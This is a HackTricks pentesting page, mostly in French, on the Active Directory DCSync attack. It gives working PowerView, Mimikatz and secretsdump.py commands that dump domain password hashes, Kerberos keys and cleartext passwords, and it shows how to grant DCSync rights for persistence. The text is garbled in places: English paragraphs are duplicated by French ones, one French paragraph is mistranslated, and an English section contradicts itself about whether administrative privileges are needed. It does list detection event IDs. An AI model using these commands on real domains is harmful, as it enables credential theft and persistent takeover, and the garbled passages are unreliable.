# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## DCSync

La permission **DCSync** implique d'avoir ces permissions sur le domaine lui-même : **DS-Replication-Get-Changes**, **Replicating Directory Changes All** et **Replicating Directory Changes In Filtered Set**.

**Notes importantes sur DCSync :**

* L'attaque **DCSync simule le comportement d'un contrôleur de domaine et demande à d'autres contrôleurs de domaine de répliquer des informations** en utilisant le protocole distant de service de réplication de répertoire (MS-DRSR). Étant donné que MS-DRSR est une fonction valide et nécessaire d'Active Directory, il ne peut pas être désactivé ou désactivé.
* Par défaut, seuls les groupes **Domain Admins, Enterprise Admins, Administrators et Domain Controllers** ont les privilèges requis.
* Si des mots de passe de compte sont stockés avec un chiffrement réversible, une option est disponible dans Mimikatz pour renvoyer le mot de passe en texte clair.

### Énumération

Vérifiez qui possède ces permissions en utilisant `powerview` :
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Exploiter localement

The first step in exploiting the DCSync attack is to gain local access to a machine within the target Active Directory (AD) environment. This can be achieved through various means, such as physical access to the machine or by exploiting vulnerabilities in the operating system or applications running on the machine.

Une fois que vous avez accès localement à une machine dans l'environnement Active Directory (AD) cible, vous pouvez passer à l'attaque DCSync. Cela peut être réalisé de différentes manières, comme l'accès physique à la machine ou l'exploitation de vulnérabilités dans le système d'exploitation ou les applications s'exécutant sur la machine.

Once you have gained local access, the next step is to escalate your privileges to that of a domain administrator. This can be done by exploiting vulnerabilities or misconfigurations that allow for privilege escalation. Once you have domain administrator privileges, you have full control over the AD environment and can perform the DCSync attack.

Une fois que vous avez accès local, la prochaine étape consiste à élever vos privilèges à ceux d'un administrateur de domaine. Cela peut être fait en exploitant des vulnérabilités ou des mauvaises configurations qui permettent une élévation de privilèges. Une fois que vous avez les privilèges d'administrateur de domaine, vous avez un contrôle total sur l'environnement AD et pouvez effectuer l'attaque DCSync.

### Exploit Remotely

### Exploiter à distance

In some cases, it may not be possible to gain local access to a machine within the target AD environment. In such situations, you can still perform the DCSync attack remotely if you have valid domain credentials.

Dans certains cas, il peut ne pas être possible d'obtenir un accès local à une machine dans l'environnement AD cible. Dans de telles situations, vous pouvez toujours effectuer l'attaque DCSync à distance si vous disposez de justificatifs de domaine valides.

To exploit the DCSync attack remotely, you need to establish a connection to a domain controller (DC) within the target AD environment. This can be done using tools like PowerShell or the Remote Server Administration Tools (RSAT). Once connected to the DC, you can use the DCSync functionality to retrieve the NTLM hashes of user accounts or the KRBTGT account.

Pour exploiter l'attaque DCSync à distance, vous devez établir une connexion à un contrôleur de domaine (DC) dans l'environnement AD cible. Cela peut être fait à l'aide d'outils tels que PowerShell ou les outils d'administration à distance du serveur (RSAT). Une fois connecté au DC, vous pouvez utiliser la fonctionnalité DCSync pour récupérer les hachages NTLM des comptes d'utilisateurs ou du compte KRBTGT.

It is important to note that remote exploitation of the DCSync attack requires valid domain credentials with sufficient privileges to connect to the DC and retrieve the desired information.

Il est important de noter que l'exploitation à distance de l'attaque DCSync nécessite des justificatifs de domaine valides avec des privilèges suffisants pour se connecter au DC et récupérer les informations souhaitées.
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploiter à distance

DCSync is a technique that allows an attacker to impersonate a domain controller and request password data from the targeted domain controller. This technique can be used remotely to extract password hashes from the Active Directory database without the need for administrative privileges.

To exploit this vulnerability, an attacker needs to have network access to the targeted domain controller. The attacker can use tools like Mimikatz or Impacket to perform the DCSync attack.

The DCSync attack can be executed in the following steps:

1. Enumerate the domain controllers in the target domain.
2. Identify the domain controller to target for the attack.
3. Use the DCSync command to request password data from the targeted domain controller.
4. Extract the password hashes from the response.

Once the attacker has obtained the password hashes, they can use various techniques to crack the hashes and obtain the plaintext passwords. This can include using tools like John the Ripper or Hashcat.

It is important to note that the DCSync attack requires the attacker to have sufficient privileges to perform the attack. This can include having domain administrator privileges or being a member of the "Replicating Directory Changes All" group.

To protect against DCSync attacks, it is recommended to implement the following measures:

- Limit the privileges of user accounts to minimize the impact of a potential compromise.
- Regularly monitor and review Active Directory logs for any suspicious activity.
- Implement strong password policies and enforce regular password changes.
- Use multi-factor authentication to add an extra layer of security to user accounts.
- Keep all systems and software up to date with the latest security patches.

By following these best practices, organizations can reduce the risk of DCSync attacks and enhance the security of their Active Directory environment.
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` génère 3 fichiers :

* un avec les **hachages NTLM**
* un avec les **clés Kerberos**
* un avec les mots de passe en clair du NTDS pour tous les comptes configurés avec le chiffrement réversible activé. Vous pouvez obtenir les utilisateurs avec le chiffrement réversible avec

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Si vous êtes un administrateur de domaine, vous pouvez accorder ces autorisations à n'importe quel utilisateur avec l'aide de `powerview` :
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Ensuite, vous pouvez **vérifier si l'utilisateur a correctement reçu** les 3 privilèges en les recherchant dans la sortie de (vous devriez pouvoir voir les noms des privilèges dans le champ "ObjectType") :
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Atténuation

* ID d'événement de sécurité 4662 (La stratégie d'audit pour l'objet doit être activée) - Une opération a été effectuée sur un objet
* ID d'événement de sécurité 5136 (La stratégie d'audit pour l'objet doit être activée) - Un objet du service d'annuaire a été modifié
* ID d'événement de sécurité 4670 (La stratégie d'audit pour l'objet doit être activée) - Les autorisations sur un objet ont été modifiées
* AD ACL Scanner - Crée et compare des rapports de création d'ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Références

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour créer et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
